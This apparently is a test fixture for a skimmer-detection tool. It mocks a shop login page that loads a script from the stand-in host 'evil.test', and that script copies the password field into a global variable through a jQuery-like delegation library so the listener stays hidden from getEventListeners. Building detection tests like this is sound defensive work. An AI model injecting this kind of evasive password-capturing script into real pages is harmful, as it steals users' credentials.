// A skimmer registered through a jQuery-like delegation library: getEventListeners only shows the
// library's dispatcher, so only input-time code names the skimmer.
import * as baseline from './baseline.js';
import { loginWith } from './probe-kit.js';

export function respond(ctx) {
  if (ctx.host === 'shop.test' && ctx.path === '/login') {
    const r = loginWith(ctx, null);
    r.body = r.body.replace('</main>', `<script src="${ctx.origin('cdn.test')}/delegate.js"></script><script src="${ctx.origin('evil.test')}/d.js"></script></main>`);
    return r;
  }
  if (ctx.host === 'cdn.test' && ctx.path === '/delegate.js') {
    return { body: "window.$on = (function () { var h = []; document.addEventListener('input', function dispatch(e) { for (var i = 0; i < h.length; i++) if (e.target.matches(h[i].s)) h[i].f(e); }); return function (s, f) { h.push({ s: s, f: f }); }; })();" };
  }
  if (ctx.host === 'evil.test' && ctx.path === '/d.js') return { body: "$on('#password', function collect(e) { window.collected = e.target.value; });" };
  return baseline.respond(ctx);
}
